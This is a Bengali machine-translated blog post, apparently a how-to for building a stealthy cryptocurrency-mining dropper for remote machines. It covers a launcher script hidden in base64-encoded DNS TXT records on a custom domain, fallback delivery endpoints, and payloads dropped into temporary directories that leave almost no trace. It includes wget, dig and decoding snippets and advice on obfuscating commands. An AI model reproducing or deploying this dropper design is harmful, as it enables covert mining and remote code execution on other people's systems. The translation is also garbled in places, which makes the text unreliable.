<!doctypehtml><html prefix="og: https://ogp.me/ns# article: http://ogp.me/ns/article# website: http://ogp.me/ns/website#"lang=bn><meta charset=UTF-8><meta content=width=device-width,initial-scale=1 name=viewport><link href=https://www.unto.re/bn/posts/chronichles_of_a_cryptonote_dropper/ rel=canonical><link title="untoreh এর সাইট"href=https://www.unto.re/feed.xml rel=alternate type=application/rss+xml><link href=https://www.unto.re/amp/bn/posts/chronichles_of_a_cryptonote_dropper/ rel=amphtml><meta content="untoreh's site"property=og:title><meta content=website property=og:type><meta content=https://www.unto.re property=og:url><meta content=https://www.unto.re/assets/appa.png property=og:image><meta content="Articles, logs, infos, status and live updates are published here."property=og:description><meta content=English property=og:locale><meta content=English property=og:locale:alternate><meta content=German property=og:locale:alternate><meta content=Italian property=og:locale:alternate><meta content="Mandarin Chinese"property=og:locale:alternate><meta content=Spanish property=og:locale:alternate><meta content=Hindi property=og:locale:alternate><meta content=Arabic property=og:locale:alternate><meta content=Portuguese property=og:locale:alternate><meta content=Bengali property=og:locale:alternate><meta content=Russian property=og:locale:alternate><meta content=Japanese property=og:locale:alternate><meta content=Punjabi property=og:locale:alternate><meta content=Javanese property=og:locale:alternate><meta content=Vietnamese property=og:locale:alternate><meta content=French property=og:locale:alternate><meta content=Urdu property=og:locale:alternate><meta content=Turkish property=og:locale:alternate><meta content=Polish property=og:locale:alternate><meta content=Ukranian property=og:locale:alternate><meta content=Dutch property=og:locale:alternate><meta content=Greek property=og:locale:alternate><meta content=Swedish property=og:locale:alternate><meta content=Zulu property=og:locale:alternate><meta content=Romanian property=og:locale:alternate><meta content=Malay property=og:locale:alternate><meta content=Korean property=og:locale:alternate><meta content=Thai property=og:locale:alternate><meta content=Filipino property=og:locale:alternate><meta content=summary name=twitter:card><meta content=@untoreh name=twitter:creator><script type=application/ld+json>{"copyrightHolder":"untoreh","@id":"https://www.unto.re","url":"https://www.unto.re","copyrightYear":2021,"@context":"https://schema.org/","image":"/assets/appa.png","@type":"WebSite"}</script><script id=ldj-webpage type=application/ld+json>{"audience":"cool people","url":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"accessibilitySummary":"Visual elements are tentatively described.","description":"...How far are you willing to go for...pennies?","author":{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"},"mentions":[],"@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"2021-08-21","dateCreated":"August 21, 2021","@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","dateModified":"2021-08-21","availableLanguage":[{"name":"English","@type":"Language"},{"name":"German","@type":"Language"},{"name":"Italian","@type":"Language"},{"name":"Mandarin Chinese","@type":"Language"},{"name":"Spanish","@type":"Language"},{"name":"Hindi","@type":"Language"},{"name":"Arabic","@type":"Language"},{"name":"Portuguese","@type":"Language"},{"name":"Bengali","@type":"Language"},{"name":"Russian","@type":"Language"},{"name":"Japanese","@type":"Language"},{"name":"Punjabi","@type":"Language"},{"name":"Javanese","@type":"Language"},{"name":"Vietnamese","@type":"Language"},{"name":"French","@type":"Language"},{"name":"Urdu","@type":"Language"},{"name":"Turkish","@type":"Language"},{"name":"Polish","@type":"Language"},{"name":"Ukranian","@type":"Language"},{"name":"Dutch","@type":"Language"},{"name":"Greek","@type":"Language"},{"name":"Swedish","@type":"Language"},{"name":"Zulu","@type":"Language"},{"name":"Romanian","@type":"Language"},{"name":"Malay","@type":"Language"},{"name":"Korean","@type":"Language"},{"name":"Thai","@type":"Language"},{"name":"Filipino","@type":"Language"}],"keywords":["crypto","net","shell"],"creativeWorkStatus":"Published","publisher":{"url":"https://www.unto.re","sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"contactPoint":{"contactType":"info","email":"contact@unto.re","@type":"ContactPoint","telephone":""},"logo":"/assets/appa-60px.png","name":"untoreh's site","@type":"Organization"},"datePublished":"2021-08-21","inLanguage":"English","image":"/assets/appa.png","name":"","mainEntityOfPage":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","@type":"Article"}}</script><script id=ldj-breadcrumbs type=application/ld+json>{"itemListElement":[{"position":1,"item":"https://www.unto.re","name":"Home","@type":"ListItem"},{"position":2,"item":"/posts/","name":"Posts List","@type":"ListItem"},{"position":3,"item":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper","name":"Chronicles of a cryptonote dropper","@type":"ListItem"}],"@type":"BreadcrumbList"}</script><link href=/libs/highlight/github.min.css rel=stylesheet><link href=/css/franklin.css rel=stylesheet><link href=/css/main.css rel=stylesheet><link href=/css/menu.css rel=stylesheet><link href=/css/pages.css rel=stylesheet><link href=/css/lunr.css rel=stylesheet><link href=/css/footer.css rel=stylesheet><link href=/css/responsive.css rel=stylesheet><link href=/css/animations.css rel=stylesheet><link href=/css/docco.css rel=stylesheet><link href=/css/flags-sprite.css rel=stylesheet><link href=/assets/favicon.png rel=icon type=image/x-icon><link href=/assets/favicon.svg rel=icon type=image/svg+xml><title> একটি ক্রিপ্টোনোট ড্রপারের ক্রনিকলস</title><meta content="...How far are you willing to go for...pennies?"name=description><script src=/libs/load.js></script><script type=application/ld+json>{"url":"/bn/posts/chronichles_of_a_cryptonote_dropper/","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"mentions":null,"description":"","@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"","dateCreated":"","@id":"/bn/posts/chronichles_of_a_cryptonote_dropper/","dateModified":"","keywords":[],"creativeWorkStatus":"Published","translator":{"url":"http://google.translate.com","name":"Google Translate","@type":"https://schema.org/Organization"},"translationOfWork":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/"},"datePublished":"2021-10-26T18:54:49.837","inLanguage":"bn","name":"","mainEntityOfPage":{"@id":"/bn/posts/chronichles_of_a_cryptonote_dropper/","@type":"Article"}}</script><body><div class=masthead><div class=masthead__menu__inner-wrap><div class=masthead__menu><a title="untoreh's site"class=site-title href=/bn/></a><div class=author__wrap><script type=application/ld+json>{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"}</script><ul><li class=author__avatar onclick=toggleTheme()><img alt=" অস্পষ্ট আলো"class=flip-front src=/assets/appa.png><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script></ul></div><nav id=site-nav><div class=horiz><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><form class=lunrSearchForm name=lunrSearchForm><button title="ওয়েবসাইট অনুসন্ধান করুন"class=search-button formaction=/search/index.html value=Search><i class="fas fa-search menu-icons"></i></button><input class=search-input name=q placeholder=Search…></form><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/bn/posts/><i class="fas fa-pen menu-icons"></i> পোস্ট</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/bn/media/><i class="fas fa-tv menu-icons"></i> মিডিয়া</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"><button title="Languages Menu"class=langs-dropdown-wrapper type=button><i class="fas fa-language menu-icons"></i> Lang <div class="langs-dropdown-content langs-dropdown-menu"><ul class=lang-list><a class="lang-link lang-ar"href=/ar/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-sa"></span>Arabic</a><a class="lang-link lang-bn"href=/bn/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-bd"></span>Bengali</a><a class="lang-link lang-nl"href=/nl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-nl"></span>Dutch</a><a class="lang-link lang-en"href=/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gb"></span>English</a><a class="lang-link lang-tl"href=/tl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ph"></span>Filipino</a><a class="lang-link lang-fr"href=/fr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-fr"></span>French</a><a class="lang-link lang-de"href=/de/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-de"></span>German</a><a class="lang-link lang-el"href=/el/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gr"></span>Greek</a><a class="lang-link lang-hi"href=/hi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Hindi</a><a class="lang-link lang-it"href=/it/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-it"></span>Italian</a><a class="lang-link lang-ja"href=/ja/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-jp"></span>Japanese</a><a class="lang-link lang-jw"href=/jw/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-id"></span>Javanese</a><a class="lang-link lang-ko"href=/ko/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-kr"></span>Korean</a><a class="lang-link lang-ms"href=/ms/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ms"></span>Malay</a><a class="lang-link lang-zh"href=/zh/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-cn"></span>Mandarin Chinese</a><a class="lang-link lang-pl"href=/pl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pl"></span>Polish</a><a class="lang-link lang-pt"href=/pt/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pt"></span>Portuguese</a><a class="lang-link lang-pa"href=/pa/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Punjabi</a><a class="lang-link lang-ro"href=/ro/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ro"></span>Romanian</a><a class="lang-link lang-ru"href=/ru/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ru"></span>Russian</a><a class="lang-link lang-es"href=/es/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-es"></span>Spanish</a><a class="lang-link lang-sv"href=/sv/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-se"></span>Swedish</a><a class="lang-link lang-th"href=/th/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-th"></span>Thai</a><a class="lang-link lang-tr"href=/tr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-tr"></span>Turkish</a><a class="lang-link lang-uk"href=/uk/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ua"></span>Ukranian</a><a class="lang-link lang-ur"href=/ur/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pk"></span>Urdu</a><a class="lang-link lang-vi"href=/vi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-vn"></span>Vietnamese</a><a class="lang-link lang-zu"href=/zu/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-za"></span>Zulu</a></ul></div></button></ul></div><button name="Website Menu"class=ham type=button><i class="fas fa-bars ham-icon"></i></button><div class=vert><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><form class=lunrSearchForm name=lunrSearchForm><button title="ওয়েবসাইট অনুসন্ধান করুন"class=search-button formaction=/search/index.html value=Search><i class="fas fa-search menu-icons"></i></button><input class=search-input name=q placeholder=Search…></form><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/bn/posts/><i class="fas fa-pen menu-icons"></i> পোস্ট</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/bn/media/><i class="fas fa-tv menu-icons"></i> মিডিয়া</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"><button title="Languages Menu"class=langs-dropdown-wrapper type=button><i class="fas fa-language menu-icons"></i> Lang <div class="langs-dropdown-content langs-dropdown-menu"><ul class=lang-list><a class="lang-link lang-ar"href=/ar/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-sa"></span>Arabic</a><a class="lang-link lang-bn"href=/bn/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-bd"></span>Bengali</a><a class="lang-link lang-nl"href=/nl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-nl"></span>Dutch</a><a class="lang-link lang-en"href=/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gb"></span>English</a><a class="lang-link lang-tl"href=/tl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ph"></span>Filipino</a><a class="lang-link lang-fr"href=/fr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-fr"></span>French</a><a class="lang-link lang-de"href=/de/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-de"></span>German</a><a class="lang-link lang-el"href=/el/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gr"></span>Greek</a><a class="lang-link lang-hi"href=/hi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Hindi</a><a class="lang-link lang-it"href=/it/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-it"></span>Italian</a><a class="lang-link lang-ja"href=/ja/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-jp"></span>Japanese</a><a class="lang-link lang-jw"href=/jw/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-id"></span>Javanese</a><a class="lang-link lang-ko"href=/ko/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-kr"></span>Korean</a><a class="lang-link lang-ms"href=/ms/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ms"></span>Malay</a><a class="lang-link lang-zh"href=/zh/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-cn"></span>Mandarin Chinese</a><a class="lang-link lang-pl"href=/pl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pl"></span>Polish</a><a class="lang-link lang-pt"href=/pt/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pt"></span>Portuguese</a><a class="lang-link lang-pa"href=/pa/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Punjabi</a><a class="lang-link lang-ro"href=/ro/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ro"></span>Romanian</a><a class="lang-link lang-ru"href=/ru/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ru"></span>Russian</a><a class="lang-link lang-es"href=/es/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-es"></span>Spanish</a><a class="lang-link lang-sv"href=/sv/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-se"></span>Swedish</a><a class="lang-link lang-th"href=/th/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-th"></span>Thai</a><a class="lang-link lang-tr"href=/tr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-tr"></span>Turkish</a><a class="lang-link lang-uk"href=/uk/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ua"></span>Ukranian</a><a class="lang-link lang-ur"href=/ur/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pk"></span>Urdu</a><a class="lang-link lang-vi"href=/vi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-vn"></span>Vietnamese</a><a class="lang-link lang-zu"href=/zu/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-za"></span>Zulu</a></ul></div></button></ul></div></nav></div></div></div><div><h1 id=title><a href=/bn/posts/chronichles_of_a_cryptonote_dropper> একটি ক্রিপ্টোনোট ড্রপারের ক্রনিকলস</a></h1><blockquote id=page-description style=font-style:italic>... আপনি কতদূর যেতে চান ... পেনিস?</blockquote></div><div class=franklin-content><p>ধরুন আপনি আমার করতে চান<a href=https://en.wikipedia.org/wiki/Cryptocurrency> ক্রিপ্টোকারেন্সি</a> রিমোট এ<em> অপার্থিব</em> হার্ডওয়্যার তোমাকে আমার কিছু খুঁজে বের করতে হবে। দূরবর্তী সার্ভার মানে, না<a href=https://en.wikipedia.org/wiki/Application-specific_integrated_circuit> এএসআইসিএস</a> অথবা কাজের অ্যালগরিদমের জিপিইউ প্রমাণ, মূলত শুধুমাত্র<a href=\posts/a-few-notes-on-proof-of-work> CPU বন্ধুত্বপূর্ণ কয়েন</a>.<h2 id=the_software><a class=header-anchor href=#the_software> সফটওয়্যার</a></h2><p>অনুসন্ধান করুন এবং খুঁজুন a<a href=https://github.com/xmrig/xmrig> খনি</a> , কিন্তু এটি সত্যিই সুন্দর নয়, আপনি এমন কিছু চাইবেন যা আপনি রিমোট থেকে ভালভাবে নিয়ন্ত্রণ করতে পারেন, তাই আপনি খুঁজে পান<a href=https://github.com/Bendr0id/xmrigCC> আরেকজন খনি</a> । আপনিও চান a<a href=https://github.com/Bendr0id/xmrigcc-proxy> প্রক্সি</a> , কারণ অনেক সংযোগ স্বল্পস্থায়ী হবে, আপনি চান না<a href=https://en.wikipedia.org/wiki/Denial-of-service_attack> ডস</a> আপনার খনির পুল। আরো একটি<a href=https://github.com/search?q=tunnel> টানেল</a> সুন্দর হবে.<h2 id=the_design><a class=header-anchor href=#the_design> নকশা</a></h2><p>কিছু বোটনেট ব্লকচেইন ডেটা ব্যবহার করে কমান্ডগুলি সন্ধান করতে,<a href=https://twitter.com/sarahjamielewis> কেউ</a> আছে বলেও মনে হয়<a href=https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968> হারানো বাজি</a> এটি আবার ঘটছে না ... যাইহোক আমরা যে অত্যাধুনিক নই, আমরা কিছু DNS রেকর্ডের মাধ্যমে পেয়ে যাব যা একটি স্ক্রিপ্ট সঞ্চয় করে যা পেলোড টেনে নেয় যা স্বয়ংক্রিয়ভাবে একটি অস্থায়ী ডিরেক্টরিতে এক্সট্রাক্ট করে এবং ছেড়ে দেয়<em> প্রায়</em> এর সেটআপের কোন চিহ্ন নেই। এখানে একটি ছোট ফ্লো চার্ট রয়েছে যা কাঠামোকে চিত্রিত করে</p><img src=/assets/posts/output/payload.png><h2 id=launcher><a class=header-anchor href=#launcher> লঞ্চার</a></h2><p>একটি স্টার্টআপ স্ক্রিপ্টের বিন্দু হল অ্যাক্সেসযোগ্য এবং সহজেই আপডেট করা যায় যাতে এটি সময়ের পরীক্ষা সহ্য করে। আপডেট করা হচ্ছে<a href=https://en.wikipedia.org/wiki/Domain_Name_System> ডিএনএস</a> রেকর্ডগুলি সহজ, এবং DNS হল সর্বশেষ জিনিস যা একটি নেটওয়ার্কের মধ্যে বন্ধ হয়ে যায়..কারণ IP ঠিকানাগুলি মনে রাখা কঠিন ... তুমি দেখো আমরা কখন<em> স্থাপনার স্ক্রিপ্ট আনা হচ্ছে</em>আমরা আসলে ইতিমধ্যে কিছু যুক্তি চালাচ্ছি, এটি লঞ্চার স্ক্রিপ্ট, এটি আমাদের রেকর্ডগুলি দেখার জন্য DNS প্রশ্নগুলি সম্পাদন করার ক্ষমতা প্রয়োজন, DNS সর্বব্যাপী হতে পারে কিন্তু<a href=https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/> খনন করা</a> এটি না.<p>এখানে একটু বিভ্রান্তি আছে, যদি আমাদের অন্য টুল ডাউনলোড করতে হয়<em> প্লেলোড ডাউনলোড করার জন্য অন্য স্ক্রিপ্ট ডাউনলোড করুন</em> আমাদের শুধু প্লেলোড ডাউনলোড করা উচিত! প্রতিরক্ষায় ... এই স্ক্রিপ্ট নৃত্যটি অস্পষ্টতা যোগ করে, লঞ্চারের শুধুমাত্র একটি বাস্তবায়ন রাখতে দেয় (রক্ষণাবেক্ষণযোগ্যতা, হ্যাঁ), বেশিরভাগ সময় প্রয়োজন হয় না .. তাই আমরা একটি পরিষেবাও দিই<a href=https://en.wikipedia.org/wiki/Standalone_program> স্থিরভাবে সংযুক্ত</a> ডিএনএস ক্যোয়ারী সম্পাদনের জন্য এক্সিকিউটেবল খনন করুন, স্ব -হোস্টিং, বা ক্লাউড হোস্টিং (হ্যাঁ 3 বা 4 এর মতো ফালব্যাক আছে, কারণ ক্লাউড পরিষেবাগুলির খুব কম ফ্রি ব্যান্ডউইথ রয়েছে, এবং কুকি বা অ্যাক্সেস টোকেনও প্রয়োজন ... তারা খুব স্ক্রিপ্ট বন্ধুত্বপূর্ণ, উদ্দেশ্যমূলকভাবে, অবশ্যই)।<p>ডিএনএস রেকর্ডে কি আছে? আমরা ব্যবহার করছি<a href=https://en.wikipedia.org/wiki/TXT_record> TXT</a> রেকর্ড, একটি কাস্টম ডোমেইনে (এখানেও ফালব্যাক)। কেন TXT? তারা সবচেয়ে বেশি পরিমাণে তথ্য সংরক্ষণ করতে পারে বলে মনে হয়<a href=https://www.ietf.org/rfc/rfc6763.txt> প্রস্তাবিত</a> উপর নির্ভর করে<em> জিনিস</em> । আমরা বিশেষভাবে ব্যবহার করছি<a href=https://www.cloudflare.com/> ক্লাউডফ্লেয়ার</a> আমাদের ডিএনএস ফিডলিংয়ের জন্য যেহেতু এটি বিনামূল্যে, এবং বেশিরভাগই শহরের একমাত্র খেলোয়াড় (<em> ভাল না সত্যিই কিন্তু অন্য কোন বিকল্প pales বৈশিষ্ট্য বিজ্ঞ</em> )। এটি ঘটে যে আপনি একাধিক টুকরা ডেটা সংরক্ষণ করতে পারেন<em> একই</em> রেকর্ড ... এটি কিছু স্পেসিফিকেশনের জন্য বিভ্রান্তিকর এবং ঝামেলা শুরু করে ... (স্পর্শকাতর) ক্লাউডফ্লেয়ার<a href=https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size> অভ্যস্ত</a> অনুমতি দিন<em> শৃঙ্খলিত</em>TXT রেকর্ড মোট k 9k বাইট, ডক্স এখন ~ 2k বাইট বলে, পরিবর্তনের আগে আমি ~ 6k ব্যবহার করছিলাম, এবং স্ক্রিপ্টটি অসম্পূর্ণভাবে পরিবেশন করছিলাম, এর পরে আমাকে স্ক্রিপ্টটি পাতলা করতে হয়েছিল এবং হাতের আগে এটি সংকুচিত করতে হয়েছিল (আসলে আমি a ব্যবহার করার চেষ্টা করেছে<a href=https://freedns.afraid.org/> মুক্ত</a> প্রদানকারী, আমাকে একদিনের মধ্যে নিষিদ্ধ করা হয়েছিল, অনুমান করে যে তাদের একটি কঠোর নো-ফ্যাট TXT রেকর্ড নীতি আছে), তবে gzip কম্প্রেশন পাইপ বন্ধুত্বপূর্ণ নয় বলে মনে হচ্ছে এবং এখনও সমস্যা সৃষ্টি করছে, তাই আমাকে কম্প্রেশন ছাড়াই স্ক্রিপ্টটি ক্রাম করতে হয়েছিল ( শেষ স্পর্শক)।<p>আমরা কিভাবে এটি সংরক্ষণ করব? TXT রেকর্ড শুধুমাত্র আলফানিউমেরিক স্ট্রিং সমর্থন করে, না<a href=https://en.wikipedia.org/wiki/Null_character> NULs</a> , তাই আমাদের এটিকে একটি নাল এনকোডিংয়ে আবৃত করতে হবে,<a href=https://en.wikipedia.org/wiki/Base64> বেস 64</a> এই সীমাবদ্ধতা পূরণ করে, এবং কারণ আমরা সংরক্ষণ করছি<em> শৃঙ্খলিত</em> টিএক্সটি রেকর্ড, আমাদের আউটপুটটি ভাগ করতে হবে, যেহেতু আমরা শেল স্টাফ ব্যবহার করছি, এটি এর মাধ্যমে করা হয়<code>-w</code> পতাকা, ব্যস্তবাক্সে এমন পতাকাটি পুরানো সংস্করণগুলিতে অনুপস্থিত (বা অপ্ট-ইন) ব্যবহৃত হত যা বিরক্তিকর ছিল, একটি বিকল্প হল ওপেনএসএসএল-এর সাথে একত্রিত এনকোডার ব্যবহার করা,<code>openssl enc -base64</code>.<p>এখন যেহেতু আমরা জানি কিভাবে আমাদের স্থাপনার স্ক্রিপ্ট সংরক্ষণ করতে হয় আমরা এটির সাথে এটি সংরক্ষণ করি<a href=https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md> cf cli</a> অথবা ম্যানুয়ালি। আমরা কিভাবে এটি টানতে? আমরা উল্লেখ করেছি যে আমাদের বিন্দুটিল বা আমাদের নিজস্ব প্রয়োজন<code>dig</code> ... পরিবেশন শেষ বিন্দু চয়ন করার পরে, আমরা এটি ডাউনলোড করতে চাই, যা পাওয়া যায় তা সাধারণত<a href=https://www.gnu.org/software/wget/> wget</a> অথবা<a href=https://curl.se/> কার্ল</a> , wget অনেক আগে থেকেই ইনস্টল করা পাওয়া যায়, তবে ব্যস্তবাক্স শুধুমাত্র গতিশীল লাইব্রেরিগুলির সাথে tls সমর্থন প্রদান করে, তাই আপনাকে নিশ্চিত করতে হবে যে এন্ডপয়েন্টটি http প্রদান করছে বা আপনার ইউটিলিটি<code>wget</code> gnu-utils থেকে<pre><code class="bash hljs"><span class=hljs-comment># the wget command</span>
wget -t 2 -T 10 -q -i- -O- > <span class=hljs-variable>$filename</span> <<< <span class=hljs-string>"<span class=hljs-variable>$digurl</span>"</span></code></pre><p>এর অর্থ চেষ্টা করা<code>-t2</code> সময় অপেক্ষা<code>-T10</code> সেকেন্ড হচ্ছে<code>-q</code> থেকে শান্ত পড়া<code>-i-</code> stdin (<code>$digurl</code> ) এবং লেখা<code>-O-</code> stdout (<code>$filename</code>)। এই কমান্ডটি আমরা প্রথম নজরে কি ডাউনলোড করছি তা প্রকাশ করে না। আমরা একই কারণে অন্যান্য শেল কমান্ডের সাথে খুব সতর্কতা অবলম্বন করতে যাচ্ছি, অথবা শেলের সাথে লেগে আছি (<a href=https://en.wikipedia.org/wiki/Bash_%28Unix_shell%29> বাশ</a> যেখানে সম্ভব অন্তর্নির্মিত। আপনি আপনার এক্সিকিউটেবলগুলি কোথায় ডাউনলোড করছেন সেদিকেও খেয়াল রাখুন, আপনি নিশ্চিত করতে চান যে আপনি সেগুলি কার্যকর করতে পারেন, যেহেতু কিছু মাউন্ট পয়েন্ট, বিশেষ করে পাত্রে এবং<code>tmp</code> পথ হল<code>noexec</code> । এখন যেহেতু আমাদের কাছে আমাদের ডিএনএস অনুসন্ধানের সরঞ্জাম রয়েছে আমরা আমাদের রেকর্ডগুলি নিয়ে আসি<pre><code class="bash hljs">dig txt <span class=hljs-variable>${record}</span>.<span class=hljs-variable>${zone}</span> +short +tcp +timeout=3 +retries=0 <span class=hljs-variable>$dnsserver</span></code></pre><p>পতাকাগুলি এখানে স্ব -ব্যাখ্যামূলক,<code>+short</code> এর মানে হল যে আমরা শুধুমাত্র ডেটাতেই আগ্রহী, যাতে আমাদের আউটপুট বিশ্লেষণ করতে না হয়। ডিএনএস সার্ভার নির্দিষ্ট করা গুরুত্বপূর্ণ, যেমন গুগল (<code>8.8.8.8</code> ) অথবা ক্লাউডফ্লেয়ার (<code>1.1.1.1</code> ) কারণ অনেক পরিবেশ ডিফল্টরূপে তাদের নিজস্ব ডিএনএস সার্ভারে পুন redনির্দেশ বা প্রক্সি ডিএনএস প্রশ্ন করে। টুকরো টুকরো স্ক্রিপ্ট আনার পরে আমরা উদ্ধৃতি এবং হোয়াইটস্পেস নিয়ে কাজ করি যাতে এটি ডিকোডিংয়ের জন্য প্রস্তুত হয়<pre><code class="bash hljs">data=<span class=hljs-variable>${data//\"}</span><span class=hljs-comment># remove quotes</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># remove whitespace</span><span class=hljs-built_in>declare</span> -a ar_data
<span class=hljs-keyword>for</span> l <span class=hljs-keyword>in</span><span class=hljs-variable>$data</span>; <span class=hljs-keyword>do</span>
    ar_data[<span class=hljs-variable>${l:0:1}</span>]=<span class=hljs-variable>${l:1}</span><span class=hljs-comment># iterate over each line and remove the first characther</span><span class=hljs-keyword>done</span>
data=<span class=hljs-variable>${ar_data[@]}</span><span class=hljs-comment># join all the lines</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># ensure joining didn't add whitespace</span><span class=hljs-comment># decode</span>
launcher=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> | <span class=hljs-variable>$b64</span> -d -w <span class=hljs-variable>$chunksize</span>)</code></pre><p>এখন যদি আমরা<em> এখনও</em> আমাদের লঞ্চার নেই? ডিএনএস অগোছালো, আমরা একটি ফালব্যাক চাই, সরাসরি একটি লঞ্চার স্ক্রিপ্ট আনতে একটি সাবডোমেন সেটআপ করতে দেই। আমাদের স্ক্রিপ্টটি মূল্যায়নের আগে আমরা কিছু ভেরিয়েবলের সাথে এটিকে কাস্টমাইজ করতে চাই, আবার একটি TXT রেকর্ড ব্যবহার করতে পারি একটি ভেরিয়েবলের NAME = VALUE তালিকা সংরক্ষণ করতে এবং এটি বিশ্লেষণ করতে। ভেরিয়েবলের জন্য একটি ফলব্যাকও রয়েছে, ক্লাউডফ্লেয়ার ইউআরএলগুলির উপর ভিত্তি করে পুনirectনির্দেশনা প্রদান করে, এই পুনirectনির্দেশগুলি পরিবেশন করা হয়<em> আগে</em> গন্তব্য, তাই আমাদের একটি এন্ডপয়েন্টের প্রয়োজন নেই, আমরা শুধু একটি কাল্পনিক এন্ডপয়েন্টে regex ভিত্তিক পুনirectনির্দেশক নিয়ম কনফিগার করতে চাই, আমরা যা আগ্রহী তা হল url এর প্যারামিটার<code>?NAME=VALUE&NAME2=VALUE2...</code>, যাতে আমরা পুন launনির্দেশিত 